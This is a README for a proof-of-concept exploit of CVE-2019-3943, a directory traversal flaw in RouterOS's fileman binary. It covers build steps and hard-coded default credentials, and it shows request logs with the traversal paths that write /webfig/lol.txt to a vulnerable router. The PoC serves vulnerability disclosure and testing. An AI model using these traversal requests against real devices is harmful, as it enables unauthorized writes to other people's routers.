# CVE-2019-3943 Proof of Concept

This is an implementation of CVE-2019-3943 which is a directory traversal vulnerability affecting the fileman binary in Router OS. This vulnerability was patched in 6.44RC1. See Tenable's advisory at: https://www.tenable.com/security/research/tra-2019-16 

The PoC creates a browseable file at /webfig/lol.txt. The contents of the file is "hello!" The PoC has the default credentials hard coded in (admin/). If you need to test other creds then you need to update the code.

## Compilation
This code was tested on Ubuntu 16.04. Install the following dependencies:

```sh
sudo apt install libboost-dev-all cmake
```

To compile simply do the following:

```sh
cd routeros/poc/cve_2019_3943/
mkdir build
cd build/
cmake ..
make
```

## Usage

Against 6.42.12:

```sh
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ curl http://192.168.1.15/webfig/lol.txt
<html>
<head><title>Error 404: Not Found</title></head>
<body>
<h1>Error 404: Not Found</h1>
</body>
</html>
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ ./cve_2019_3943_poc -i 192.168.1.15 -p 8291
req: {bff0005:1,uff0006:1,uff0007:6,s1:'//./.././.././../pckg/lol',Uff0001:[72,1]}
resp: {uff0003:2,uff0006:1,Uff0001:[],Uff0002:[72,1]}
req: {bff0005:1,uff0006:2,uff0007:6,s1:'//./.././.././../pckg/lol/home',Uff0001:[72,1]}
resp: {uff0003:2,uff0006:2,Uff0001:[],Uff0002:[72,1]}
req: {bff0005:1,uff0006:3,uff0007:6,s1:'//./.././.././../pckg/lol/home/web/',Uff0001:[72,1]}
resp: {uff0003:2,uff0006:3,Uff0001:[],Uff0002:[72,1]}
req: {bff0005:1,uff0006:4,uff0007:6,s1:'//./.././.././../pckg/lol/home/web/webfig',Uff0001:[72,1]}
resp: {uff0003:2,uff0006:4,Uff0001:[],Uff0002:[72,1]}
req: {bff0005:1,uff0006:5,uff0007:1,s1:'//./.././.././../pckg/lol/home/web/webfig/lol.txt',Uff0001:[72,1]}
resp: {ufe0001:1,uff0003:2,uff0006:5,Uff0001:[],Uff0002:[72,1]}
req: {bff0005:1,ufe0001:1,uff0006:6,uff0007:2,r5:[104,101,108,108,111,33,10],Uff0001:[72,1]}
resp: {uff0003:2,uff0006:6,Uff0001:[],Uff0002:[72,1]}
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ curl http://192.168.1.15/webfig/lol.txt
hello!
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ 
```

Against 6.44.2
```sh
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ curl http://192.168.1.14/webfig/lol.txt
<html>
<head><title>Error 404: Not Found</title></head>
<body>
<h1>Error 404: Not Found</h1>
</body>
</html>
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ ./cve_2019_3943_poc -i 192.168.1.14 -p 8291
req: {bff0005:1,uff0006:1,uff0007:6,s1:'//./.././.././../pckg/lol',Uff0001:[72,1]}
resp: {uff0003:2,uff0004:2,uff0006:1,uff0008:16646153,Uff0001:[],Uff0002:[72,1]}
Not permitted
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ curl http://192.168.1.14/webfig/lol.txt
<html>
<head><title>Error 404: Not Found</title></head>
<body>
<h1>Error 404: Not Found</h1>
</body>
</html>
albinolobster@ubuntu:~/routeros/poc/cve_2019_3943/build$ 
```